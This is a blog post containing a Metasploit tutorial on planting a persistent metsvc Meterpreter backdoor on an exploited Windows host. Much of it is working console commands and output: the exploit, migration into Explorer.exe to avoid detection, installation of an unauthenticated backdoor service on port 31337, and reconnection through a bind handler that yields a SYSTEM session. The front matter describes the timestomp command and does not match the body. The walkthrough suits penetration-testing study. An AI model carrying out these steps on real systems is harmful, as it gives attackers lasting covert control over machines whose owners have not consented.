---
title: MSF Meterpreter Backdoor
layout: post
date: 2017-06-15 09:01:06.000000000 +02:00
type: post
author: siberoloji
img: metasploit.jpg
published: false
status: publish
categories:
- Nasıl
- Araştırma
tags:
- msfconsole
- metasploit Framework
- Metasploit Framework timestomp
- msf meterpreter timestomp

excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
---

Meterpreter Backdoor
After going through all the hard work of exploiting a system, it’s often a good idea to leave yourself an easier way back into the system for later use. This way, if the service you initially exploited is down or patched, you can still gain access to the system. To read about the original implementation of metsvc, go to http://www.phreedom.org/software/metsvc/.

Using the metsvc backdoor, you can gain a Meterpreter shell at any point.

One word of warning here before we go any further. Metsvc as shown here requires no authentication. This means that anyone that gains access to the port could access your back door! This is not a good thing if you are conducting a penetration test, as this could be a significant risk. In a real world situation, you would either alter the source to require authentication, or filter out remote connections to the port through some other method.

First, we exploit the remote system and migrate to the ‘Explorer.exe’ process in case the user notices the exploited service is not responding and decides to kill it.

msf exploit(3proxy) > exploit

[*] Started reverse handler
[*] Trying target Windows XP SP2 - English...
[*] Sending stage (719360 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)

meterpreter > ps

Process list
============

    PID   Name                 Path
    ---   ----                 ----
    132   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
    176   svchost.exe          C:\WINDOWS\system32\svchost.exe
    440   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
    632   Explorer.EXE         C:\WINDOWS\Explorer.EXE
    796   smss.exe             \SystemRoot\System32\smss.exe
    836   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    844   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    884   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
    908   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
    952   services.exe         C:\WINDOWS\system32\services.exe
    964   lsass.exe            C:\WINDOWS\system32\lsass.exe
    1120  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
    1136  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1236  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1560  alg.exe              C:\WINDOWS\System32\alg.exe
    1568  WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
    1596  jusched.exe          C:\Program Files\Java\jre6\bin\jusched.exe
    1656  msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
    1748  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
    1928  jqs.exe              C:\Program Files\Java\jre6\bin\jqs.exe
    2028  snmp.exe             C:\WINDOWS\System32\snmp.exe
    2840  3proxy.exe           C:\3proxy\bin\3proxy.exe
    3000  mmc.exe              C:\WINDOWS\system32\mmc.exe

meterpreter > migrate 632
[*] Migrating to 632...
[*] Migration completed successfully.
Before installing metsvc, let’s see what options are available to us.

meterpreter > run metsvc -h
[*]
OPTIONS:

    -A        Automatically start a matching multi/handler to connect to the service
    -h        This help menu
    -r        Uninstall an existing Meterpreter service (files must be deleted manually)

meterpreter >
Since we’re already connected via a Meterpreter session, we won’t set it to connect back to us right away. We’ll just install the service for now.

meterpreter > run metsvc
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\DOCUME~1\victim\LOCALS~1\Temp\JplTpVnksh...
[*]  >> Uploading metsrv.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
[*]      * Installing service metsvc
 * Starting service
Service metsvc successfully installed.

meterpreter >
The service is now installed and waiting for a connection.

Interacting with Metsvc

We will now use the multi/handler with a payload of windows/metsvc_bind_tcp to connect to the remote system. This is a special payload, as typically a Meterpreter payload is multistage, where a minimal amount of code is sent as part of the exploit, and then more is uploaded after code execution has been accomplished.

Think of a shuttle rocket, and the booster rockets that are used to get the space shuttle into orbit. This is much the same, except instead of extra items being there and then dropping off, Meterpreter starts as small as possible, then adds on. In this case however, the full Meterpreter code has already been uploaded to the remote machine, and there is no need for a staged connection.

We set all of our options for metsvc_bind_tcp with the victim’s IP address and the port we wish to have the service connect to on our machine. We then run the exploit.

msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
PAYLOAD => windows/metsvc_bind_tcp
msf exploit(handler) > set LPORT 31337
LPORT => 31337
msf exploit(handler) > set RHOST 192.168.1.104
RHOST => 192.168.1.104
msf exploit(handler) > show options

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/metsvc_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LPORT     31337            yes       The local port
   RHOST     192.168.1.104    no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > exploit
Immediately after issuing ‘exploit’, our metsvc backdoor connects back to us.

[*] Starting the payload handler...
[*] Started bind handler
[*] Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)

meterpreter > ps

Process list
============

   PID   Name               Path                                                  
   ---   ----               ----                                                  
   140   smss.exe           \SystemRoot\System32\smss.exe                         
   168   csrss.exe          \??\C:\WINNT\system32\csrss.exe                       
   188   winlogon.exe       \??\C:WINNT\system32\winlogon.exe                    
   216   services.exe       C:\WINNT\system32\services.exe                        
   228   lsass.exe          C:\WINNT\system32\lsass.exe                           
   380   svchost.exe        C:\WINNT\system32\svchost.exe                         
   408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                         
   444   svchost.exe        C:\WINNT\System32\svchost.exe                         
   480   regsvc.exe         C:\WINNT\system32\regsvc.exe                          
   500   MSTask.exe         C:\WINNT\system32\MSTask.exe                          
   528   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe
   564   metsvc.exe         c:\WINNT\my\metsvc.exe                                
   588   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                    
   676   cmd.exe            C:\WINNT\System32\cmd.exe                             
   724   cmd.exe            C:\WINNT\System32\cmd.exe                             
   764   mmc.exe            C:\WINNT\system32\mmc.exe                             
   816   metsvc-server.exe  c:\WINNT\my\metsvc-server.exe                         
   888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe   
   896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe   
   940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe          
   972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
   1000  Explorer.exe       C:\WINNT\Explorer.exe                                 
   1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe

meterpreter > pwd
C:\WINDOWS\system32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
And here we have a typical Meterpreter session! Again, be careful with when and how you use this trick. System owners will not be happy if you make an attackers job easier for them by placing such a useful backdoor on the system for them.
